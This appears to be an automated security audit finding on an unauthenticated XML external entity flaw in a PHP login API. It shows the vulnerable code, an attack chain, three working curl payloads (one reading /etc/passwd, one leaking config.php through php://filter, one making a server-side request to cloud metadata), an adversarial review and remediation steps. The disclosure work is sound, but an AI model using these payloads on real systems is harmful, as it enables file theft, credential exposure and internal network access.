# Vulnerability: XXE / Sensitive Data Disclosure — Unauthenticated XML external entity in `user/api.php`

## Summary
`user/api.php` reads the raw request body and parses it as XML after explicitly re-enabling
libxml's external entity loader (`libxml_disable_entity_loader(false)`, `:2`) with
`LIBXML_NOENT | LIBXML_DTDLOAD` (`:5`). The parsed `<user>` value is echoed back in the
response (`:10`), giving unauthenticated arbitrary local file disclosure (including PHP
source via `php://filter`) and SSRF to internal services/cloud metadata. The file does **not**
include `init.php`, so neither authentication nor AumWAF applies.

## Confidence
High — found by both taint directions and survived all three adversarial attacks with a
fully cited path.

## Authentication Requirement
Unauthenticated.

## Attack Surface Location
- **Endpoint:** `POST /user/api.php`
- **Handler:** `user/api.php:2-10`
- **Framework protections bypassed:** `user/api.php` has no `init.php` include, so AumWAF
  (`init.php:34-38`) never runs and there is no session/auth check. Entity expansion is
  explicitly forced on (`:2`, `:5`).

## Attack Chain
1. **Initial access:** attacker sends an unauthenticated HTTP POST to `/user/api.php`.
2. **Endpoint interaction:** supplies an XML `Content-Type` body.
3. **Malicious input:** XML with `<!DOCTYPE creds [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
   referenced as `&xxe;` inside `<user>` (or an external-DTD payload for SSRF).
4. **Sink execution:** `DOMDocument::loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD)` (`:5`)
   substitutes/loads the external entity; `simplexml_import_dom()` exposes it as
   `$creds->user` (`:6-7`).
5. **Post-exploitation:** `echo "You have logged in as user $user"` (`:10`) reflects the
   resolved file content (or an outbound request to an internal URL is issued).
6. **Final impact:** arbitrary file read (e.g. `config.php` DB credentials) and SSRF to
   internal hosts / `169.254.169.254` metadata.

## Data Flow
- **Source (user input):** HTTP request body read via `file_get_contents('php://input')` (`user/api.php:3`).
- **Sink:** `DOMDocument::loadXML(..., LIBXML_NOENT | LIBXML_DTDLOAD)` (`:5`), reflected at `:10`.

```
php://input [user/api.php:3] → $xmlfile → loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD) [user/api.php:5]
  → simplexml_import_dom($dom) [user/api.php:6] → $creds->user [user/api.php:7] → echo [user/api.php:10]
```

## Proof of Concept

### Prerequisites
- Network access to `/user/api.php`; target runs PHP 7.2 (`Dockerfile:1`).

### Exploit Request
```bash
# Arbitrary file read
curl -s -X POST 'http://{{TARGET_HOST}}/user/api.php' \
  -H 'Content-Type: application/xml' --data-binary \
'<?xml version="1.0"?>
<!DOCTYPE creds [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<creds><user>&xxe;</user><pass>x</pass></creds>'

# PHP source disclosure (DB credentials)
curl -s -X POST 'http://{{TARGET_HOST}}/user/api.php' \
  -H 'Content-Type: application/xml' --data-binary \
'<?xml version="1.0"?>
<!DOCTYPE creds [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<creds><user>&xxe;</user><pass>x</pass></creds>'

# SSRF to cloud metadata
curl -s -X POST 'http://{{TARGET_HOST}}/user/api.php' \
  -H 'Content-Type: application/xml' --data-binary \
'<?xml version="1.0"?>
<!DOCTYPE creds [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<creds><user>&xxe;</user><pass>x</pass></creds>'
```

### Expected Vulnerable Response
```
Not Implented yet<br />
You have logged in as user root:x:0:0:root:/root:/bin/bash
...
```
or the base64 of `config.php` (decodes to `'pass' => 'snf1AvQ74DtF1PJp'`).

### Expected Patched Response
The entity is not resolved; `You have logged in as user ` is empty (or parsing fails) and no
file/URL is fetched.

### Impact Demonstration
The attacker reads `/etc/passwd` and `config.php` (DB credentials), and can issue
server-side requests to internal services / cloud metadata from an unauthenticated endpoint.

## Affected Code
```php
// user/api.php:1-10
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$user = $creds->user;
$pass = $creds->pass;
echo "Not Implented yet<br />\n";
echo "You have logged in as user $user<br />\n";
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `user/api.php` is a directly reachable file and
  does not include `init.php`, so no WAF/auth runs; the body is read from `php://input`
  (`:3`), fully external.
- **Impact attack — FAILED to kill.** Classic XXE: arbitrary local file read and SSRF, both
  explicitly in scope; the value is reflected (`:10`).
- **Validity attack — FAILED to kill.** Entity loading is explicitly re-enabled (`:2`) and
  `LIBXML_NOENT | LIBXML_DTDLOAD` substitute/load external entities (`:5`); no sanitizer or
  `DOCTYPE` rejection exists.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Remove `libxml_disable_entity_loader(false)`; parse without `LIBXML_NOENT`/`LIBXML_DTDLOAD`
and with `LIBXML_NONET`; reject `<!DOCTYPE`/`<!ENTITY` in the body (or use
`libxml_set_external_entity_loader(fn() => null)`). Add the standard `init.php` auth guard if
the endpoint must exist, and apply egress filtering.
